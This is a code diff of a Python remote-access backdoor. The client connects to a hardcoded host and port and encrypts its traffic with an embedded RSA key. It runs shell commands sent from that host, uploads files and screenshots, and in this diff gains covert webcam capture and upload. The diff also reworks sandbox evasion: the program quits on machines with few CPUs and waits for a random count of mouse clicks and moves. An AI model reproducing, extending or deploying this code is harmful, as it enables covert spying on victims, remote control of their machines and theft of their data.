@@ -1,4 +1,4 @@
-import socket,subprocess,os,time,tempfile,multiprocessing,sys
+import socket,subprocess,os,time,tempfile,multiprocessing,sys,random,cv2
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 from mss import mss
@@ -78,20 +78,25 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 -----END RSA PRIVATE KEY-----'''
         self.IP = IP
         self.PORT = PORT
-        self.click = 0
+        self.clicks = 0
+        self.max_clicks = random.randint(5,15)
+        self.max_move = random.randint(5000,15000)
+        self.move = 0
+
+    def on_move(self,x, y):
+        self.move += 1
 
     def onclick(self, x, y, button, pressed):
         if pressed:
-            self.click += 1
-            if self.click == 4:
+            self.clicks += 1
+            if self.clicks == self.max_clicks and self.move > self.max_move :
                 self.listener.stop()
 
     def evade(self):
-        time.sleep(120)
-        with Listener(on_click=self.onclick) as self.listener:
-            self.listener.join()
         if multiprocessing.cpu_count() < 4:
-            self.evade()
+            exit()
+        with Listener(on_click=self.onclick,on_move=self.on_move) as self.listener:
+            self.listener.join() 
 
     def encrypt(self, msg):
         public_key = RSA.importKey(self.publickey)
@@ -113,9 +118,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         except:
             time.sleep(2)
             self.connect(self.IP, self.PORT)
-
-    
-            
+      
     def exec_cmd(self, cmd):
         res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)
         stdout = res.stdout.read().decode().strip()
@@ -138,7 +141,6 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
             encrypted = self.encrypt(msg)
         encrypted += "done".encode()
         self.connection.send(encrypted)
-
 
     def r_recv(self):
         data = "".encode()
@@ -235,6 +237,25 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         with open("chromelog.txt",'r') as fp:
             l = fp.readline()
             os.startfile(l)
+    
+    def cam(self):
+        current_dir = os.getcwd()
+        os.chdir(tempfile.gettempdir())
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        return_value, image = camera.read()
+        cv2.imwrite("image.png", image)
+        self.upload("image.png")
+        os.remove("image.png")
+        os.chdir(current_dir)
+
+    def screenshot(self):
+        current_dir = os.getcwd()
+        os.chdir(tempfile.gettempdir())
+        with mss() as sct:
+            sct.shot()
+        self.upload("monitor-1.png")
+        os.remove("monitor-1.png")
+        os.chdir(current_dir)
         
     def run(self):
         self.connect(self.IP, self.PORT)
@@ -256,16 +277,10 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                     self.run()
                 elif cmd[0] == "search" and len(cmd)>1:
                     self.search(cmd[1])
-
                 elif cmd[0] == "capture":
-                    current_dir = os.getcwd()
-                    temp_dir = tempfile.gettempdir()
-                    os.chdir(temp_dir)
-                    with mss() as sct:
-                        sct.shot()
-                    self.upload("monitor-1.png")
-                    os.remove("monitor-1.png")
-                    os.chdir(current_dir)
+                    self.screenshot()
+                elif cmd[0] == "cam":
+                    self.cam()
                 elif len(cmd)>0:
                     cmd = ' '.join(cmd)
                     result = self.exec_cmd(cmd)
@@ -276,6 +291,6 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 
 
 backdoor = Backdoor("192.168.1.99",2000)
-backdoor.persistence()
-backdoor.evade()
+#backdoor.persistence()
+#backdoor.evade()
 backdoor.run()
